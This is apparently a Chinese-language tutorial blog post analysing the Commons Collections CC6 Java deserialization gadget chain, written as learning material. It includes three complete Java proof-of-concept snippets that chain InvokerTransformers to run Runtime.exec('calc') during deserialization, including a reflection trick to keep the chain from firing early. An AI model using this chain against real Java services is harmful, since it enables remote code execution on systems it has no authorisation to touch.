---
title: JAVA安全:CC6链
---

*作者：Narcher*	*时间：2024/3/17*	*分类：Vulnerability Analysis*

<!--more-->

## 前言

CC6这条链不受jdk版本限制，可谓非常好用。当初我接触到的第一个Java反序列化的题就是用CC6解决的，印象十分深刻。

之前我们学习了URLDNS这条链，实际上就是为了CC6做准备，因为二者有一些异曲同工之妙。



## 正文

我们先和往常一样，去看一下ysoserial中的CC6的流程：

<img src="JAVA%E5%AE%89%E5%85%A8CC6%E9%93%BE/1710674911617.png" alt="1710674911617" style="zoom: 67%;" />

可以发现这条链的后半部分和我们的CC1这条链的后半部分一模一样，前边则是由AnnotationInvocationHandler的invoke方法触发get方法修改成了TiedMapEntry类中的方法来触发。我们来调试一下看看。

### 1.TiedMapEntry部分

首先，前边一模一样，我就直接copy过来了，直接从TiedMapEntry的getValue()方法来看。

<img src="JAVA%E5%AE%89%E5%85%A8CC6%E9%93%BE/1710675220741.png" alt="1710675220741" style="zoom:67%;" />

实际上它的getValue中调用了map的get方法，而map是可控的，因此我们可以直接传入构造好的LazyMap，之后我们再看一下key，其实这个key我们是完全不用管的，因为CC1的时候已经讲过，ConstantTransformer无视了调用时的传参。

之后我们再看一下谁调用了getValue方法：

<img src="JAVA%E5%AE%89%E5%85%A8CC6%E9%93%BE/1710676136336.png" alt="1710676136336" style="zoom:67%;" />

实际上，还是这个类里边的hashCode方法。

### 2.HashMap部分

看见hashCode方法，我们又刚学完URLDNS这条链，实际上就很明白了，直接上HashMap梭哈（既能调用hashCode方法，又直接重写了readObject方法，简直完美）：

<img src="JAVA%E5%AE%89%E5%85%A8CC6%E9%93%BE/1710676313296.png" alt="1710676313296" style="zoom:67%;" />

HashMap的readObject方法中有这么一句，调用了hash方法，而hash方法内则又调用了hashCode:

<img src="JAVA%E5%AE%89%E5%85%A8CC6%E9%93%BE/1710676379690.png" alt="1710676379690" style="zoom:67%;" />

这样我们就只需要注意将key传参为我们想要利用的TiedMapEntry就好了。

### 3.构造链

我们把上边所说的按流程串起来：

```java
Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
};
ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
HashMap<Object,Object> map = new HashMap<>();
map.put("value","value");
LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);
TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, "aaa");
HashMap<Object, Object> hashMap = new HashMap<>();
hashMap.put(tiedMapEntry, "bbb");
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\CC6.txt"));
oos.writeObject(hashMap);
//反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\CC6.txt"));
ois.readObject();
```

看起来不错，但完成了吗？

实际上是没有的。我们前边学了URLDNS链可以知道，实际上在给hashMap put的时候就已经触发这条链了，这倒也没关系，只要反序列化的时候能再次触发一遍就好了，但实际上也不行，我们调试一下看看：

<img src="JAVA%E5%AE%89%E5%85%A8CC6%E9%93%BE/1710683200764.png" alt="1710683200764" style="zoom: 67%;" />

可以看到，根本没有进去，这其实是因为之前已经触发过一次，所以innermap中已经存在这个key了。

其实解决方法也很简单，直接在序列化之前删除掉这个key就好了。

直接：

```java
innerMap.remove("aaa");
```

。。。。。。。。。。。。。。。。。。。。。。。。。。。。

#### 疑惑

这里有一个小插曲，本人在复现的时候，并未像网上所说的在hashMap put的时候调用这条链，而是在

```java
TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, "aaa");
```

这时候就已经触发这条链了。经调试，看起来像是在给key和map赋值的时候连着触发了三次（其实这也很奇怪，因为key居然没有存下来，而是在最后的时候存了下来，使得并没有在put方法中触发链子）。网上有师傅说是IDEA配置的问题，但经过测试，并非是IDEA调试导致的toString等一系列方法的触发。

<img src="JAVA%E5%AE%89%E5%85%A8CC6%E9%93%BE/1710683911222.png" alt="1710683911222" style="zoom:67%;" />

~~这个疑惑目前还未解决，但并不妨碍之后链子的触发。~~

已解决，ytgg也说是IDEA的配置问题，今早打开电脑重新试了一下就成功了，猜测是IDEA的缓存问题，怪事......

。。。。。。。。。。。。。。。。。。。。。。。。。。。。

再进入正文，我们不想在序列化之前触发这条链，那就需要改一下前边的流程，并在序列化前用反射给改回去，其实改的方法有很多，我们可以改tiedMapEntry，也可以改innermap，还可以改chainedTransformer。我在这里改了chainedTransformer：

```java
Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
};
ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
HashMap<Object,Object> map = new HashMap<>();
Map<Object,Object> innerMap = LazyMap.decorate(map, new ConstantTransformer(1));
TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, "aaa");
HashMap<Object, Object> hashMap = new HashMap<>();
hashMap.put(tiedMapEntry, "bbb");
innerMap.remove("aaa");
Class c = LazyMap.class;
Field factoryField = c.getDeclaredField("factory");
factoryField.setAccessible(true);
factoryField.set(innerMap,chainedTransformer);
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\CC6.txt"));
oos.writeObject(hashMap);
//反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\CC6.txt"));
ois.readObject();
```

这样一来，CC6就大功告成了。

## 后文

以上的CC6是白日梦组长讲的版本，和ysoserial中的CC6的差别为最终的readObject方法所属的类。上边讲的是用的HashMap的readObject，ysoserial中用的是HashSet的readObject。改起来也很简单，具体代码如下：

```java
Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),
};
ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
HashMap<Object,Object> map = new HashMap<>();
Map<Object,Object> innerMap = LazyMap.decorate(map, new ConstantTransformer(1));
TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, "aaa");
LinkedHashSet set = new LinkedHashSet();
set.add(tiedMapEntry);
innerMap.remove("aaa");
Class c = LazyMap.class;
Field factoryField = c.getDeclaredField("factory");
factoryField.setAccessible(true);
factoryField.set(innerMap,chainedTransformer);
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\CC6.txt"));
oos.writeObject(set);
//反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\CC6.txt"));
ois.readObject();
```